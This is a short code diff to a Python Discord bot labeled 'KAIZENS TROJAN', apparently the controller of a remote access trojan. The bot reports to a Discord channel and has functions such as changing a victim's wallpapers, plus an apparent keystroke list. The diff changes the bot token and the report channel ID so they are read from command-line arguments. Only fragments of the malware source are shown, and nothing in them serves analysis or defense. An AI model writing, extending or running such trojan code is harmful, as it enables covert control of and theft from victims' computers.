@@ -52,7 +52,7 @@ import numpy
 intents = discord.Intents.default()
 intents.messages = True
 client = commands.Bot(command_prefix="!", intents=intents)
-bot_token = ""
+bot_token = sys.argv[1]
 thumbnail_url = "https://cdn.discordapp.com/attachments/1305451657357819926/1318625531872411758/2.png?ex=67630139&is=6761afb9&hm=b2e618aff9fb69621fb7d8532e3160733424791fbe2f5b74d3f4c4a812ce21b1&"
 count = 0
 keys = []
@@ -124,7 +124,7 @@ async def change_wallpapers_in_folder(ctx, folder_name: str, delay: float = 0.1)
 # Function when out Bot is alive
 @client.event
 async def on_ready():
-    report_channel = client.get_channel(1318209012151484488)
+    report_channel = client.get_channel(int(sys.argv[2])) #set the input for integer
     time.sleep(2)
 
     myEmbed = discord.Embed(title="KAIZENS TROJAN")
